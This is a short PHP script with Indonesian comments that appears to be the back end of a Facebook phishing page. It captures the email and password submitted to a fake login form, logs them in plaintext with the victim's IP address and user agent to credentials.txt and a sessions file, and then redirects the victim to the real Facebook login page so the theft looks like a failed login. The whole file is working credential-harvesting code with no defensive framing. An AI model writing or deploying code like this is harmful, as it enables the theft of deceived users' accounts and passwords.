<?php
// File untuk menyimpan hasil
$log_file = "credentials.txt";
$session_file = "sessions.txt";

// Ambil data dari form
$email = $_POST['email'] ?? '';
$password = $_POST['pass'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Format data
$data = "========== NEW LOGIN ==========\n";
$data .= "Timestamp: $timestamp\n";
$data .= "IP Address: $ip\n";
$data .= "User Agent: $user_agent\n";
$data .= "Email/Username: $email\n";
$data .= "Password: $password\n";
$data .= "================================\n\n";

// Simpan ke file kredensial
file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);

// Buat session ID unik
$session_id = md5($email . $timestamp . $ip);
$session_data = "$session_id|$email|$password|$timestamp|$ip\n";
file_put_contents($session_file, $session_data, FILE_APPEND | LOCK_EX);

// Redirect ke Facebook asli
header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
exit();
?>
